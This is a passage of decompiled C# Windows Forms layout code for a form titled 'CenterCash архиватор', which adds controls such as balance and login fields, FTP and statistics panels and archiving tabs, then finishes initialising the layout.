      this.Controls.Add((Control) this.label11);
      this.Controls.Add((Control) this.label12);
      this.Controls.Add((Control) this.YesterdaySum);
      this.Controls.Add((Control) this.TodaySum);
      this.Controls.Add((Control) this.label78);
      this.Controls.Add((Control) this.label5);
      this.Controls.Add((Control) this.BalanceSum);
      this.Controls.Add((Control) this.label3);
      this.Controls.Add((Control) this.LoginTXT);
      this.Controls.Add((Control) this.label1);
      this.Controls.Add((Control) this.Link_about);
      this.Controls.Add((Control) this.Link_forum);
      this.Controls.Add((Control) this.Link_site);
      this.Controls.Add((Control) this.Link_help);
      this.Controls.Add((Control) this.TXT_LastNews);
      this.Controls.Add((Control) this.Web_enter);
      this.Controls.Add((Control) this.Tab_styles);
      this.Controls.Add((Control) this.Tab_addvance);
      this.Controls.Add((Control) this.Tab_archivation);
      this.Font = new Font("Arial", 11f, FontStyle.Regular, GraphicsUnit.Pixel, (byte) 204);
      this.FormBorderStyle = FormBorderStyle.FixedSingle;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.MaximizeBox = false;
      this.MaximumSize = new Size(795, 586);
      this.MinimumSize = new Size(795, 586);
      this.Name = nameof (Form1);
      this.Text = "CenterCash архиватор";
      this.FormClosed += new FormClosedEventHandler(this.Form1_FormClosed);
      this.Resize += new EventHandler(this.Form1_Resize);
      ((ISupportInitialize) this.Tab_archivation).EndInit();
      ((ISupportInitialize) this.Tab_addvance).EndInit();
      ((ISupportInitialize) this.Tab_styles).EndInit();
      ((ISupportInitialize) this.Web_enter).EndInit();
      this.Tab_archivation_panel.ResumeLayout(false);
      this.Tab_archivation_panel.PerformLayout();
      this.Menu_archiveList.ResumeLayout(false);
      this.Menu_archiveList.PerformLayout();
      ((ISupportInitialize) this.pictureBox2).EndInit();
      this.Menu_archivation.ResumeLayout(false);
      this.Menu_archivation.PerformLayout();
      ((ISupportInitialize) this.pictureBox1).EndInit();
      this.Menu_Project.ResumeLayout(false);
      this.Menu_Project.PerformLayout();
      ((ISupportInitialize) this.pictureBox4).EndInit();
      this.Menu_Tasks.ResumeLayout(false);
      this.Menu_Tasks.PerformLayout();
      ((ISupportInitialize) this.pictureBox3).EndInit();
      ((ISupportInitialize) this.Tab_archivation_hover).EndInit();
      ((ISupportInitialize) this.Tab_styles_hover).EndInit();
      ((ISupportInitialize) this.Tab_addvance_hover).EndInit();
      this.Tab_styles_panel.ResumeLayout(false);
      this.Tab_styles_panel.PerformLayout();
      this.Menu_styleList.ResumeLayout(false);
      this.Menu_styleList.PerformLayout();
      ((ISupportInitialize) this.pictureBox9).EndInit();
      this.Menu_newstyle.ResumeLayout(false);
      this.Menu_newstyle.PerformLayout();
      ((ISupportInitialize) this.pictureBox10).EndInit();
      this.Cont_Main.ResumeLayout(false);
      this.Menu_statistic_cont.ResumeLayout(false);
      this.Menu_statistic_cont.PerformLayout();
      this.Menu_newstyle_cont.ResumeLayout(false);
      this.Menu_newstyle_cont.PerformLayout();
      this.Menu_archivation_cont.ResumeLayout(false);
      this.Menu_archivation_cont.PerformLayout();
      this.ForUpdateArchive.ResumeLayout(false);
      this.ForUpdateArchive.PerformLayout();
      this.ForNewArch.ResumeLayout(false);
      this.ForNewArch.PerformLayout();
      this.panel4.ResumeLayout(false);
      this.panel4.PerformLayout();
      this.panel3.ResumeLayout(false);
      this.panel3.PerformLayout();
      this.panel2.ResumeLayout(false);
      this.panel2.PerformLayout();
      this.panel1.ResumeLayout(false);
      this.panel1.PerformLayout();
      this.Menu_styleList_cont.ResumeLayout(false);
      this.Menu_styleList_cont.PerformLayout();
      this.Menu_archiveList_cont.ResumeLayout(false);
      this.Menu_archiveList_cont.PerformLayout();
      this.Menu_FTP_cont.ResumeLayout(false);
      this.Menu_FTP_cont.PerformLayout();
      this.Tab_addvance_panel.ResumeLayout(false);
      this.Tab_addvance_panel.PerformLayout();
      this.panel7.ResumeLayout(false);
      this.panel7.PerformLayout();
      ((ISupportInitialize) this.pictureBox6).EndInit();
      this.Menu_FTP.ResumeLayout(false);
      this.Menu_FTP.PerformLayout();
      ((ISupportInitialize) this.pictureBox7).EndInit();
      this.Menu_statistic.ResumeLayout(false);
      this.Menu_statistic.PerformLayout();
      ((ISupportInitialize) this.pictureBox8).EndInit();
      this.Menu_Tasks_cont.ResumeLayout(false);
      this.Menu_Tasks_cont.PerformLayout();
      this.Menu_Project_cont.ResumeLayout(false);
      this.Menu_Project_cont.PerformLayout();
      this.flowLayoutPanel1.ResumeLayout(false);
      this.flowLayoutPanel1.PerformLayout();
      this.flowLayoutPanel2.ResumeLayout(false);
      this.flowLayoutPanel2.PerformLayout();
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
